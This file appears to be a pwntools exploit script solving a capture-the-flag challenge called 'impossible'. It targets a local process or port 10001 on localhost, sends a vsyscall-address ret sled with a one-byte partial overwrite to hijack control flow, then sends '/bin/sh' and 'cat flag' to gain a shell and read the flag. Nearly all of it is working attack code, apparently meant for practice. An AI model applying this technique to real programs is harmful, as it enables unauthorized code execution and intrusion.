#!/usr/bin/env python
# encoding: utf-8
from pwn import *
import random, string
from hashlib import sha256
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
debug = 1

if debug:
    io = process('./impossible')
else:
    io = remote("127.0.0.1", 10001)

io.recvuntil("Hack me please!\n")
gdb.attach(io.pid)
vsyscall = 0xffffffffff600000
io.interactive()
io.send(p64(vsyscall)*30+'\x6b')
io.recv()
io.sendline('/bin/sh')
io.sendline('cat flag')
io.interactive()
